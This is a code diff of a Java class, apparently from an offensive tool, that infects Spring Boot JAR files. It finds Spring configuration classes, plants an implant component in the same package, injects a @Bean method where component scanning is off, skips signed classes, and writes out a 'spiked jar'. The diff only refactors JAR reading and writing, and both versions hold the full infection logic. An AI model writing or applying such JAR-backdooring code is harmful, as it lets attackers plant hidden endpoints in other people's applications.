@@ -35,78 +35,77 @@ public class SpringInjector {
             return false;
         }
 
-        try (StreamedJarFiddler fiddler = StreamedJarFiddler.open(targetJarFilePath, outputJar)) {
-            for (StreamedJarFiddler.StreamedJarEntry entry : fiddler) {
-                if (!entry.getName().endsWith(".class")) {
-                    entry.forward();
+        BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
+        for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
+            if (!entry.getName().endsWith(".class")) {
+                continue;
+            }
+            if (entry.toJarEntry().getCodeSigners() != null) {
+                foundSignedClasses = true;
+                continue;
+            }
+
+            ClassFile currentlyProcessing;
+            try (DataInputStream in = new DataInputStream(entry.getContentStream())) {
+                currentlyProcessing = new ClassFile(in);
+                if (!isSpringConfigurationClass(currentlyProcessing)) {
                     continue;
                 }
-                if (entry.getEntry().getCodeSigners() != null) {
-                    foundSignedClasses = true;
-                    entry.forward();
+                System.out.println("[+] Found Spring configuration: " + entry.getName());
+
+                /*
+                 * By adding our own Spring component (like a RestController) into the JAR under the same package
+                 * as the Spring config class, Spring will happily load it automatically. This is assuming that
+                 * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
+                 * component needs to be explicitly referenced as a @Bean in the config class.
+                 */
+                ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
+                String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
+                String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
+                implantComponent.setName(targetPackageName + "." + implantComponentClassName);
+                JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
+                try {
+                    fiddler.addNewEntry(newJarEntry, asByteArray(implantComponent));
+                } catch (ZipException e) {
+                    // QUICKFIX: The entry most likely already exist in the ZIP file
+                    System.out.println("[-] Component already exist in JAR: '" + newJarEntry + "' (skipping).");
                     continue;
+                    // TODO This is _not_ a solid way of moving on. The actual class in the JAR could be something else than implantComponent.
                 }
+                System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
 
-                ClassFile currentlyProcessing;
-                try (DataInputStream in = new DataInputStream(entry.getContent())) {
-                    currentlyProcessing = new ClassFile(in);
-                    if (!isSpringConfigurationClass(currentlyProcessing)) {
-                        entry.forward();
-                        continue;
-                    }
-                    System.out.println("[+] Found Spring configuration: " + entry.getName());
-
+                if (!hasComponentScanEnabled(currentlyProcessing)) {
                     /*
-                     * By adding our own Spring component (like a RestController) into the JAR under the same package
-                     * as the Spring config class, Spring will happily load it automatically. This is assuming that
-                     * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
-                     * component needs to be explicitly referenced as a @Bean in the config class.
+                     * Component Scanning seems to not be enabled for this Spring configuration.
+                     * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
                      */
-                    ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
-                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
-                    String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
-                    implantComponent.setName(targetPackageName + "." + implantComponentClassName);
-                    JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
-                    try {
-                        implantComponent.write(fiddler.addNewEntry(newJarEntry));
-                    } catch (ZipException e) {
-                        // QUICKFIX: The entry most likely already exist in the ZIP file
-                        System.out.println("[-] Component already exist in JAR: '" + newJarEntry + "' (skipping).");
-                        entry.forward();
+                    System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");
+
+                    ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
+                    if (!addBeanToSpringConfig(currentlyProcessing, implantComponent, implantSpringConfig)) {
+                        System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
                         continue;
-                        // TODO This is _not_ a solid way of moving on. The actual class in the JAR could be something else than implantComponent.
-                    }
-                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
-
-                    if (!hasComponentScanEnabled(currentlyProcessing)) {
-                        /*
-                         * Component Scanning seems to not be enabled for this Spring configuration.
-                         * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
-                         */
-                        System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");
-
-                        ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
-                        if (!addBeanToSpringConfig(currentlyProcessing, implantComponent, implantSpringConfig)) {
-                            System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
-                            entry.forward();
-                            continue;
-                        }
-
-                        currentlyProcessing.write(entry.replaceContentByStream());
-                        System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
-                    } else {
-                        entry.forward();
                     }
 
-                    didInfect = true;
-                } catch (ClassNotFoundException e) {
-                    throw new RuntimeException(e);
+                    entry.replaceContentWith(asByteArray(currentlyProcessing));
+                    System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
                 }
-            }
 
-            if (foundSignedClasses) {
-                System.out.println("[-] Found signed classes. These were not considered for infection.");
+                didInfect = true;
+            } catch (ClassNotFoundException e) {
+                throw new RuntimeException(e);
             }
+        }
+
+        if (foundSignedClasses) {
+            System.out.println("[-] Found signed classes. These were not considered for infection.");
+        }
+
+        fiddler.write(outputJar);
+        if (didInfect) {
+            System.out.println("[+] Write spiked jar to " + outputJar);
+        } else {
+            System.out.println("[+] Wrote untouched JAR to " + outputJar);
         }
 
         return didInfect;
